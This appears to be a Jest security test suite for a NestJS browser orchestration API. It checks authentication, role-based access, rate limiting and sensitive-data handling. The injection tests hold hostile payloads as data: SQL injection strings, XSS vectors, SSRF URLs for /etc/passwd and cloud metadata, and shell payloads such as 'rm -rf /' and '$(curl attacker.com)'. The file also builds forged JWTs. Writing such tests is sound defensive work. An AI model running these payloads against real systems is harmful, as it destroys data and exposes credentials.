/**
 * Browser Orchestration Security Tests
 *
 * Comprehensive security tests for browser orchestration system.
 * Tests authentication, authorization, security vulnerabilities,
 * access controls, data protection, and security compliance.
 *
 * @author Claude Code
 * @version 1.0.0
 * @date 2025-09-20
 */

import { Test, TestingModule } from '@nestjs/testing';
import { INestApplication, HttpStatus } from '@nestjs/common';
import { ConfigModule } from '@nestjs/config';
import * as request from 'supertest';
import * as jwt from 'jsonwebtoken';
import * as crypto from 'crypto';
import { BrowserUseModule } from '../src/browser-use/browser-use.module';
import { SecurityModule } from '../src/common/security/security.module';
import { AuthModule } from '../src/auth/auth.module';
import { PrismaService } from '../src/database/prisma.service';
import {
  CreateOrchestrationDto,
  OrchestrationStrategy,
  TaskPriority,
} from '../src/browser-use/dto/browser-orchestration.dto';

describe('Browser Orchestration Security Tests', () => {
  let app: INestApplication;
  let prismaService: PrismaService;

  // Test users with different roles and permissions
  const testUsers = {
    admin: {
      username: 'admin-user',
      password: 'admin-password-123',
      role: 'admin',
      permissions: ['*'], // All permissions
      token: '',
    },
    operator: {
      username: 'operator-user',
      password: 'operator-password-123',
      role: 'operator',
      permissions: [
        'browser:orchestration:create',
        'browser:orchestration:execute',
        'browser:orchestration:read',
        'browser:session:create',
        'browser:session:read',
        'browser:task:create',
        'browser:task:execute',
        'browser:task:read',
      ],
      token: '',
    },
    viewer: {
      username: 'viewer-user',
      password: 'viewer-password-123',
      role: 'viewer',
      permissions: [
        'browser:orchestration:read',
        'browser:session:read',
        'browser:task:read',
      ],
      token: '',
    },
    unauthorized: {
      username: 'unauthorized-user',
      password: 'unauthorized-password-123',
      role: 'guest',
      permissions: [],
      token: '',
    },
  };

  // Security test configuration
  const securityConfig = {
    testTimeout: 60000,
    jwtSecret: process.env.JWT_SECRET || 'test-secret-key',
    encryptionKey: process.env.ENCRYPTION_KEY || 'test-encryption-key',
    maxLoginAttempts: 5,
    sessionTimeout: 3600, // 1 hour
    rateLimitRequests: 100,
    rateLimitWindow: 900, // 15 minutes
  };

  beforeAll(async () => {
    const moduleFixture: TestingModule = await Test.createTestingModule({
      imports: [
        ConfigModule.forRoot({
          isGlobal: true,
          envFilePath: '.env.test',
        }),
        SecurityModule,
        AuthModule,
        BrowserUseModule,
      ],
    }).compile();

    app = moduleFixture.createNestApplication();

    // Enable security features
    app.enableCors({
      origin: ['http://localhost:3000', 'https://localhost:3000'],
      credentials: true,
      methods: ['GET', 'POST', 'PUT', 'DELETE'],
      allowedHeaders: ['Content-Type', 'Authorization'],
    });

    await app.init();

    prismaService = moduleFixture.get<PrismaService>(PrismaService);

    // Setup test users and get authentication tokens
    await setupTestUsers();
  }, securityConfig.testTimeout);

  afterAll(async () => {
    await cleanupTestData();
    await app?.close();
  }, securityConfig.testTimeout);

  describe('Authentication Security', () => {
    it('should reject requests without authentication tokens', async () => {
      const createOrchestrationDto: CreateOrchestrationDto = {
        name: 'Unauthorized Test',
        strategy: OrchestrationStrategy.SEQUENTIAL,
        tasks: [
          {
            name: 'Test Task',
            type: 'navigation',
            url: 'https://example.com',
            instructions: 'Test navigation',
            priority: TaskPriority.NORMAL,
          },
        ],
      };

      await request(app.getHttpServer())
        .post('/browser-orchestration/orchestrations')
        .send(createOrchestrationDto)
        .expect(HttpStatus.UNAUTHORIZED);
    });

    it('should reject requests with invalid authentication tokens', async () => {
      const invalidTokens = [
        'invalid-token',
        'Bearer invalid-token',
        'Bearer',
        '',
        'malformed.jwt.token',
        generateExpiredToken(),
        generateTamperedToken(),
      ];

      for (const token of invalidTokens) {
        await request(app.getHttpServer())
          .get('/browser-orchestration/orchestrations')
          .set(
            'Authorization',
            token.startsWith('Bearer') ? token : `Bearer ${token}`,
          )
          .expect(HttpStatus.UNAUTHORIZED);
      }
    });

    it('should validate JWT token signature and prevent tampering', async () => {
      // Create a valid token structure but with wrong signature
      const tamperedToken = jwt.sign(
        {
          sub: 'test-user',
          role: 'admin',
          permissions: ['*'],
        },
        'wrong-secret',
        { expiresIn: '1h' },
      );

      await request(app.getHttpServer())
        .get('/browser-orchestration/orchestrations')
        .set('Authorization', `Bearer ${tamperedToken}`)
        .expect(HttpStatus.UNAUTHORIZED);
    });

    it('should handle token expiration correctly', async () => {
      const expiredToken = jwt.sign(
        {
          sub: 'test-user',
          role: 'admin',
          permissions: ['*'],
        },
        securityConfig.jwtSecret,
        { expiresIn: '-1h' }, // Expired 1 hour ago
      );

      await request(app.getHttpServer())
        .get('/browser-orchestration/orchestrations')
        .set('Authorization', `Bearer ${expiredToken}`)
        .expect(HttpStatus.UNAUTHORIZED);
    });

    it('should implement account lockout after failed login attempts', async () => {
      const invalidCredentials = {
        username: testUsers.admin.username,
        password: 'wrong-password',
      };

      // Attempt multiple failed logins
      for (let i = 0; i < securityConfig.maxLoginAttempts + 1; i++) {
        const response = await request(app.getHttpServer())
          .post('/auth/login')
          .send(invalidCredentials);

        if (i < securityConfig.maxLoginAttempts) {
          expect([
            HttpStatus.UNAUTHORIZED,
            HttpStatus.TOO_MANY_REQUESTS,
          ]).toContain(response.status);
        } else {
          expect(response.status).toBe(HttpStatus.TOO_MANY_REQUESTS);
        }
      }

      // Verify that even correct credentials are rejected after lockout
      await request(app.getHttpServer())
        .post('/auth/login')
        .send({
          username: testUsers.admin.username,
          password: testUsers.admin.password,
        })
        .expect(HttpStatus.TOO_MANY_REQUESTS);
    });

    it('should enforce secure password requirements', async () => {
      const weakPasswords = [
        '123',
        'password',
        'admin',
        '12345678',
        'qwerty',
        'password123',
        'abcdefgh',
      ];

      for (const weakPassword of weakPasswords) {
        const response = await request(app.getHttpServer())
          .post('/auth/register')
          .send({
            username: `test-user-${Date.now()}`,
            password: weakPassword,
            role: 'viewer',
          });

        expect([
          HttpStatus.BAD_REQUEST,
          HttpStatus.UNPROCESSABLE_ENTITY,
        ]).toContain(response.status);
      }
    });
  });

  describe('Authorization and Access Control', () => {
    it('should enforce role-based access control for orchestration creation', async () => {
      const createOrchestrationDto: CreateOrchestrationDto = {
        name: 'RBAC Test Orchestration',
        strategy: OrchestrationStrategy.PARALLEL,
        tasks: [
          {
            name: 'RBAC Test Task',
            type: 'navigation',
            url: 'https://example.com',
            instructions: 'Test RBAC navigation',
            priority: TaskPriority.HIGH,
          },
        ],
      };

      // Admin should be able to create
      await request(app.getHttpServer())
        .post('/browser-orchestration/orchestrations')
        .set('Authorization', `Bearer ${testUsers.admin.token}`)
        .send(createOrchestrationDto)
        .expect(HttpStatus.CREATED);

      // Operator should be able to create
      await request(app.getHttpServer())
        .post('/browser-orchestration/orchestrations')
        .set('Authorization', `Bearer ${testUsers.operator.token}`)
        .send(createOrchestrationDto)
        .expect(HttpStatus.CREATED);

      // Viewer should NOT be able to create
      await request(app.getHttpServer())
        .post('/browser-orchestration/orchestrations')
        .set('Authorization', `Bearer ${testUsers.viewer.token}`)
        .send(createOrchestrationDto)
        .expect(HttpStatus.FORBIDDEN);

      // Unauthorized user should NOT be able to create
      await request(app.getHttpServer())
        .post('/browser-orchestration/orchestrations')
        .set('Authorization', `Bearer ${testUsers.unauthorized.token}`)
        .send(createOrchestrationDto)
        .expect(HttpStatus.FORBIDDEN);
    });

    it('should enforce fine-grained permissions for orchestration operations', async () => {
      // Create an orchestration as admin
      const createResponse = await request(app.getHttpServer())
        .post('/browser-orchestration/orchestrations')
        .set('Authorization', `Bearer ${testUsers.admin.token}`)
        .send({
          name: 'Permission Test Orchestration',
          strategy: OrchestrationStrategy.SEQUENTIAL,
          tasks: [
            {
              name: 'Permission Test Task',
              type: 'navigation',
              url: 'https://example.com',
              instructions: 'Test permissions',
              priority: TaskPriority.NORMAL,
            },
          ],
        })
        .expect(HttpStatus.CREATED);

      const orchestrationId = createResponse.body.id;

      // Test read permissions
      await request(app.getHttpServer())
        .get(`/browser-orchestration/orchestrations/${orchestrationId}`)
        .set('Authorization', `Bearer ${testUsers.viewer.token}`)
        .expect(HttpStatus.OK);

      // Test execute permissions
      await request(app.getHttpServer())
        .post(
          `/browser-orchestration/orchestrations/${orchestrationId}/execute`,
        )
        .set('Authorization', `Bearer ${testUsers.operator.token}`)
        .expect(HttpStatus.OK);

      await request(app.getHttpServer())
        .post(
          `/browser-orchestration/orchestrations/${orchestrationId}/execute`,
        )
        .set('Authorization', `Bearer ${testUsers.viewer.token}`)
        .expect(HttpStatus.FORBIDDEN);

      // Test cancel permissions (admin only)
      await request(app.getHttpServer())
        .post(`/browser-orchestration/orchestrations/${orchestrationId}/cancel`)
        .set('Authorization', `Bearer ${testUsers.operator.token}`)
        .expect(HttpStatus.FORBIDDEN);

      await request(app.getHttpServer())
        .post(`/browser-orchestration/orchestrations/${orchestrationId}/cancel`)
        .set('Authorization', `Bearer ${testUsers.admin.token}`)
        .expect(HttpStatus.OK);
    });

    it('should prevent privilege escalation attempts', async () => {
      // Attempt to modify user role in JWT payload
      const escalationToken = jwt.sign(
        {
          sub: testUsers.viewer.username,
          role: 'admin', // Attempting to escalate to admin
          permissions: ['*'],
          originalRole: 'viewer',
        },
        securityConfig.jwtSecret,
        { expiresIn: '1h' },
      );

      // The system should detect this as unauthorized
      await request(app.getHttpServer())
        .post('/browser-orchestration/agents/scale')
        .set('Authorization', `Bearer ${escalationToken}`)
        .send({ targetAgents: 10 })
        .expect(HttpStatus.FORBIDDEN);
    });

    it('should enforce resource ownership and isolation', async () => {
      // Create orchestrations as different users
      const operatorOrchestration = await request(app.getHttpServer())
        .post('/browser-orchestration/orchestrations')
        .set('Authorization', `Bearer ${testUsers.operator.token}`)
        .send({
          name: 'Operator Orchestration',
          strategy: OrchestrationStrategy.PARALLEL,
          tasks: [
            {
              name: 'Operator Task',
              type: 'navigation',
              url: 'https://example.com',
              instructions: 'Operator task',
              priority: TaskPriority.NORMAL,
            },
          ],
        })
        .expect(HttpStatus.CREATED);

      const viewerOrchestration = await request(app.getHttpServer())
        .post('/browser-orchestration/orchestrations')
        .set('Authorization', `Bearer ${testUsers.admin.token}`) // Admin creates for viewer
        .send({
          name: 'Viewer Orchestration',
          strategy: OrchestrationStrategy.SEQUENTIAL,
          ownedBy: testUsers.viewer.username,
          tasks: [
            {
              name: 'Viewer Task',
              type: 'navigation',
              url: 'https://example.com',
              instructions: 'Viewer task',
              priority: TaskPriority.NORMAL,
            },
          ],
        })
        .expect(HttpStatus.CREATED);

      // Viewer should not be able to access operator's orchestration
      await request(app.getHttpServer())
        .get(
          `/browser-orchestration/orchestrations/${operatorOrchestration.body.id}`,
        )
        .set('Authorization', `Bearer ${testUsers.viewer.token}`)
        .expect(HttpStatus.FORBIDDEN);

      // Operator should not be able to modify viewer's orchestration
      await request(app.getHttpServer())
        .post(
          `/browser-orchestration/orchestrations/${viewerOrchestration.body.id}/execute`,
        )
        .set('Authorization', `Bearer ${testUsers.operator.token}`)
        .expect(HttpStatus.FORBIDDEN);
    });
  });

  describe('Input Validation and Injection Prevention', () => {
    it('should prevent SQL injection attacks', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE browser_orchestrations; --",
        "' OR '1'='1",
        "'; INSERT INTO users (username, role) VALUES ('hacker', 'admin'); --",
        "' UNION SELECT * FROM users WHERE '1'='1",
        "'; DELETE FROM browser_tasks WHERE '1'='1'; --",
      ];

      for (const payload of sqlInjectionPayloads) {
        const maliciousDto: CreateOrchestrationDto = {
          name: payload,
          strategy: OrchestrationStrategy.SEQUENTIAL,
          tasks: [
            {
              name: payload,
              type: 'navigation',
              url: `https://example.com/${payload}`,
              instructions: payload,
              priority: TaskPriority.NORMAL,
            },
          ],
        };

        const response = await request(app.getHttpServer())
          .post('/browser-orchestration/orchestrations')
          .set('Authorization', `Bearer ${testUsers.admin.token}`)
          .send(maliciousDto);

        // Should either be created safely (sanitized) or rejected
        expect([HttpStatus.CREATED, HttpStatus.BAD_REQUEST]).toContain(
          response.status,
        );

        if (response.status === HttpStatus.CREATED) {
          // Verify the data was sanitized
          expect(response.body.name).not.toContain('DROP TABLE');
          expect(response.body.name).not.toContain('DELETE FROM');
        }
      }
    });

    it('should prevent XSS attacks in task instructions', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')">',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<svg onload="alert(\'XSS\')">',
        '"><script>alert("XSS")</script>',
      ];

      for (const payload of xssPayloads) {
        const maliciousDto: CreateOrchestrationDto = {
          name: 'XSS Test Orchestration',
          strategy: OrchestrationStrategy.SEQUENTIAL,
          tasks: [
            {
              name: 'XSS Test Task',
              type: 'navigation',
              url: 'https://example.com',
              instructions: payload,
              priority: TaskPriority.NORMAL,
            },
          ],
        };

        const response = await request(app.getHttpServer())
          .post('/browser-orchestration/orchestrations')
          .set('Authorization', `Bearer ${testUsers.admin.token}`)
          .send(maliciousDto);

        if (response.status === HttpStatus.CREATED) {
          // Verify XSS payloads are sanitized
          const taskInstructions = response.body.tasks[0].instructions;
          expect(taskInstructions).not.toContain('<script>');
          expect(taskInstructions).not.toContain('javascript:');
          expect(taskInstructions).not.toContain('onerror=');
          expect(taskInstructions).not.toContain('onload=');
        }
      }
    });

    it('should validate and sanitize URL inputs', async () => {
      const maliciousUrls = [
        'javascript:alert("XSS")',
        'data:text/html,<script>alert("XSS")</script>',
        'file:///etc/passwd',
        'http://localhost:22', // SSH port
        'ftp://malicious-server.com',
        'ldap://attacker.com',
        'http://169.254.169.254/latest/meta-data/', // AWS metadata
      ];

      for (const maliciousUrl of maliciousUrls) {
        const maliciousDto: CreateOrchestrationDto = {
          name: 'URL Validation Test',
          strategy: OrchestrationStrategy.SEQUENTIAL,
          tasks: [
            {
              name: 'Malicious URL Task',
              type: 'navigation',
              url: maliciousUrl,
              instructions: 'Navigate to malicious URL',
              priority: TaskPriority.NORMAL,
            },
          ],
        };

        const response = await request(app.getHttpServer())
          .post('/browser-orchestration/orchestrations')
          .set('Authorization', `Bearer ${testUsers.admin.token}`)
          .send(maliciousDto);

        // Should reject dangerous URLs
        expect([
          HttpStatus.BAD_REQUEST,
          HttpStatus.UNPROCESSABLE_ENTITY,
        ]).toContain(response.status);
      }
    });

    it('should prevent command injection in task parameters', async () => {
      const commandInjectionPayloads = [
        '; rm -rf /',
        '| cat /etc/passwd',
        '&& wget malicious-script.sh',
        '$(curl attacker.com)',
        '`rm important-file.txt`',
        '; python -c "import os; os.system(\'rm -rf /\')"',
      ];

      for (const payload of commandInjectionPayloads) {
        const maliciousDto: CreateOrchestrationDto = {
          name: 'Command Injection Test',
          strategy: OrchestrationStrategy.SEQUENTIAL,
          tasks: [
            {
              name: 'Command Injection Task',
              type: 'custom_script',
              url: 'https://example.com',
              instructions: `Execute command: ${payload}`,
              priority: TaskPriority.NORMAL,
              scriptParameters: {
                command: payload,
                args: [payload],
              },
            },
          ],
        };

        const response = await request(app.getHttpServer())
          .post('/browser-orchestration/orchestrations')
          .set('Authorization', `Bearer ${testUsers.admin.token}`)
          .send(maliciousDto);

        // Should reject or sanitize command injection attempts
        expect([HttpStatus.CREATED, HttpStatus.BAD_REQUEST]).toContain(
          response.status,
        );

        if (response.status === HttpStatus.CREATED) {
          // Verify commands are sanitized
          const taskInstructions = response.body.tasks[0].instructions;
          expect(taskInstructions).not.toContain('rm -rf');
          expect(taskInstructions).not.toContain('cat /etc/passwd');
          expect(taskInstructions).not.toContain('wget');
        }
      }
    });
  });

  describe('Rate Limiting and DoS Protection', () => {
    it('should enforce rate limiting on API endpoints', async () => {
      const requests: Promise<any>[] = [];

      // Rapid fire requests exceeding rate limit
      for (let i = 0; i < securityConfig.rateLimitRequests + 10; i++) {
        const request_promise = request(app.getHttpServer())
          .get('/browser-orchestration/orchestrations')
          .set('Authorization', `Bearer ${testUsers.admin.token}`);

        requests.push(request_promise);
      }

      const responses = await Promise.allSettled(requests);
      const tooManyRequestsResponses = responses.filter(
        (result) =>
          result.status === 'fulfilled' &&
          result.value.status === HttpStatus.TOO_MANY_REQUESTS,
      );

      expect(tooManyRequestsResponses.length).toBeGreaterThan(0);
    });

    it('should protect against orchestration creation flooding', async () => {
      const orchestrationPromises: Promise<any>[] = [];

      // Attempt to create many orchestrations rapidly
      for (let i = 0; i < 50; i++) {
        const createPromise = request(app.getHttpServer())
          .post('/browser-orchestration/orchestrations')
          .set('Authorization', `Bearer ${testUsers.admin.token}`)
          .send({
            name: `Flood Test Orchestration ${i}`,
            strategy: OrchestrationStrategy.SEQUENTIAL,
            tasks: [
              {
                name: `Flood Task ${i}`,
                type: 'navigation',
                url: 'https://example.com',
                instructions: `Flood test task ${i}`,
                priority: TaskPriority.NORMAL,
              },
            ],
          });

        orchestrationPromises.push(createPromise);
      }

      const results = await Promise.allSettled(orchestrationPromises);
      const rateLimitedResponses = results.filter(
        (result) =>
          result.status === 'fulfilled' &&
          result.value.status === HttpStatus.TOO_MANY_REQUESTS,
      );

      // Should have some rate-limited responses
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    it('should limit resource consumption per user', async () => {
      // Attempt to create orchestrations with excessive resource requirements
      const resourceIntensiveDto: CreateOrchestrationDto = {
        name: 'Resource Exhaustion Test',
        strategy: OrchestrationStrategy.PARALLEL,
        maxConcurrentAgents: 1000, // Excessive
        maxConcurrentSessions: 1000, // Excessive
        tasks: Array.from({ length: 1000 }, (_, i) => ({
          name: `Resource Task ${i}`,
          type: 'resource_intensive',
          url: 'https://example.com',
          instructions: `Resource intensive task ${i}`,
          priority: TaskPriority.HIGH,
          resourceRequirements: {
            memory: '16GB',
            cpu: '100%',
            bandwidth: '1GB/s',
          },
        })),
      };

      const response = await request(app.getHttpServer())
        .post('/browser-orchestration/orchestrations')
        .set('Authorization', `Bearer ${testUsers.operator.token}`)
        .send(resourceIntensiveDto);

      // Should reject excessive resource requests
      expect([
        HttpStatus.BAD_REQUEST,
        HttpStatus.UNPROCESSABLE_ENTITY,
      ]).toContain(response.status);
    });
  });

  describe('Data Protection and Privacy', () => {
    it('should encrypt sensitive data in orchestration configurations', async () => {
      const sensitiveDto: CreateOrchestrationDto = {
        name: 'Sensitive Data Test',
        strategy: OrchestrationStrategy.SEQUENTIAL,
        tasks: [
          {
            name: 'Sensitive Task',
            type: 'form_interaction',
            url: 'https://example.com/login',
            instructions: 'Login with credentials',
            priority: TaskPriority.HIGH,
            sensitiveData: {
              username: 'sensitive-username',
              password: 'sensitive-password',
              apiKey: 'secret-api-key-12345',
              creditCard: '4111-1111-1111-1111',
            },
          },
        ],
      };

      const response = await request(app.getHttpServer())
        .post('/browser-orchestration/orchestrations')
        .set('Authorization', `Bearer ${testUsers.admin.token}`)
        .send(sensitiveDto);

      if (response.status === HttpStatus.CREATED) {
        // Verify sensitive data is encrypted in response
        const responseBody = JSON.stringify(response.body);
        expect(responseBody).not.toContain('sensitive-password');
        expect(responseBody).not.toContain('secret-api-key-12345');
        expect(responseBody).not.toContain('4111-1111-1111-1111');

        // Verify data is encrypted in database
        const orchestration =
          await prismaService.browserOrchestration.findUnique({
            where: { id: response.body.id },
            include: { tasks: true },
          });

        if (orchestration && orchestration.tasks.length > 0) {
          const taskConfig = orchestration.tasks[0].configuration as any;
          expect(taskConfig.sensitiveData).toBeDefined();
          expect(typeof taskConfig.sensitiveData).toBe('string'); // Should be encrypted string
        }
      }
    });

    it('should prevent sensitive data leakage in logs and responses', async () => {
      const sensitiveOrchestrationDto: CreateOrchestrationDto = {
        name: 'Data Leakage Test',
        strategy: OrchestrationStrategy.SEQUENTIAL,
        tasks: [
          {
            name: 'Sensitive Logging Task',
            type: 'api_call',
            url: 'https://api.example.com/data',
            instructions: 'Make API call with sensitive data',
            priority: TaskPriority.NORMAL,
            headers: {
              Authorization: 'Bearer secret-token-12345',
              'X-API-Key': 'api-key-67890',
            },
            bodyData: {
              ssn: '123-45-6789',
              creditCard: '4111-1111-1111-1111',
              password: 'secret-password',
            },
          },
        ],
      };

      const response = await request(app.getHttpServer())
        .post('/browser-orchestration/orchestrations')
        .set('Authorization', `Bearer ${testUsers.admin.token}`)
        .send(sensitiveOrchestrationDto);

      // Check that sensitive data is not exposed in API responses
      const responseBody = JSON.stringify(response.body);
      expect(responseBody).not.toContain('secret-token-12345');
      expect(responseBody).not.toContain('api-key-67890');
      expect(responseBody).not.toContain('123-45-6789');
      expect(responseBody).not.toContain('4111-1111-1111-1111');
      expect(responseBody).not.toContain('secret-password');
    });

    it('should implement secure session management', async () => {
      // Test session creation with security headers
      const response = await request(app.getHttpServer())
        .post('/auth/login')
        .send({
          username: testUsers.admin.username,
          password: testUsers.admin.password,
        });

      if (response.status === HttpStatus.OK) {
        // Check for secure session headers
        expect(response.headers['set-cookie']).toBeDefined();

        const cookieHeader = response.headers['set-cookie'][0];
        expect(cookieHeader).toContain('HttpOnly');
        expect(cookieHeader).toContain('Secure');
        expect(cookieHeader).toContain('SameSite');
      }
    });
  });

  describe('Security Headers and Configuration', () => {
    it('should include security headers in all responses', async () => {
      const response = await request(app.getHttpServer())
        .get('/browser-orchestration/health')
        .set('Authorization', `Bearer ${testUsers.admin.token}`);

      // Check for required security headers
      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-frame-options']).toBeOneOf([
        'DENY',
        'SAMEORIGIN',
      ]);
      expect(response.headers['x-xss-protection']).toBe('1; mode=block');
      expect(response.headers['strict-transport-security']).toBeDefined();
      expect(response.headers['content-security-policy']).toBeDefined();
    });

    it('should enforce CORS policy correctly', async () => {
      // Test CORS with allowed origin
      const allowedOriginResponse = await request(app.getHttpServer())
        .options('/browser-orchestration/orchestrations')
        .set('Origin', 'http://localhost:3000')
        .set('Access-Control-Request-Method', 'POST')
        .set('Access-Control-Request-Headers', 'Content-Type, Authorization');

      expect(allowedOriginResponse.status).toBe(HttpStatus.OK);
      expect(allowedOriginResponse.headers['access-control-allow-origin']).toBe(
        'http://localhost:3000',
      );

      // Test CORS with disallowed origin
      const disallowedOriginResponse = await request(app.getHttpServer())
        .options('/browser-orchestration/orchestrations')
        .set('Origin', 'http://malicious-site.com')
        .set('Access-Control-Request-Method', 'POST');

      expect(
        disallowedOriginResponse.headers['access-control-allow-origin'],
      ).toBeUndefined();
    });
  });

  // Helper Functions
  async function setupTestUsers(): Promise<void> {
    for (const [userType, userData] of Object.entries(testUsers)) {
      try {
        // Create user (if registration endpoint exists)
        await request(app.getHttpServer()).post('/auth/register').send({
          username: userData.username,
          password: userData.password,
          role: userData.role,
        });
      } catch (error) {
        // User might already exist, continue to login
      }

      // Login to get token
      try {
        const loginResponse = await request(app.getHttpServer())
          .post('/auth/login')
          .send({
            username: userData.username,
            password: userData.password,
          });

        if (
          loginResponse.status === HttpStatus.OK &&
          loginResponse.body.accessToken
        ) {
          userData.token = loginResponse.body.accessToken;
        } else {
          // Generate mock token for testing
          userData.token = jwt.sign(
            {
              sub: userData.username,
              role: userData.role,
              permissions: userData.permissions,
            },
            securityConfig.jwtSecret,
            { expiresIn: '1h' },
          );
        }
      } catch (error) {
        // Generate mock token as fallback
        userData.token = jwt.sign(
          {
            sub: userData.username,
            role: userData.role,
            permissions: userData.permissions,
          },
          securityConfig.jwtSecret,
          { expiresIn: '1h' },
        );
      }
    }
  }

  function generateExpiredToken(): string {
    return jwt.sign(
      {
        sub: 'expired-user',
        role: 'admin',
        permissions: ['*'],
      },
      securityConfig.jwtSecret,
      { expiresIn: '-1h' },
    );
  }

  function generateTamperedToken(): string {
    const validToken = jwt.sign(
      {
        sub: 'test-user',
        role: 'viewer',
        permissions: ['read'],
      },
      securityConfig.jwtSecret,
      { expiresIn: '1h' },
    );

    // Tamper with the token by changing the payload
    const parts = validToken.split('.');
    const tamperedPayload = Buffer.from(
      JSON.stringify({
        sub: 'test-user',
        role: 'admin', // Tampered: changed from viewer to admin
        permissions: ['*'], // Tampered: changed permissions
      }),
    ).toString('base64url');

    return `${parts[0]}.${tamperedPayload}.${parts[2]}`;
  }

  async function cleanupTestData(): Promise<void> {
    try {
      await prismaService.browserTask.deleteMany({
        where: { name: { contains: 'Test' } },
      });
      await prismaService.browserSession.deleteMany({
        where: { name: { contains: 'Test' } },
      });
      await prismaService.browserOrchestration.deleteMany({
        where: { name: { contains: 'Test' } },
      });
    } catch (error) {
      console.warn('Error cleaning test data:', error);
    }
  }
});

// Custom Jest matcher
declare global {
  namespace jest {
    interface Matchers<R> {
      toBeOneOf(values: any[]): R;
    }
  }
}

expect.extend({
  toBeOneOf(received, argument) {
    const pass = argument.includes(received);
    return {
      message: () =>
        pass
          ? `expected ${received} not to be one of ${argument}`
          : `expected ${received} to be one of ${argument}`,
      pass,
    };
  },
});
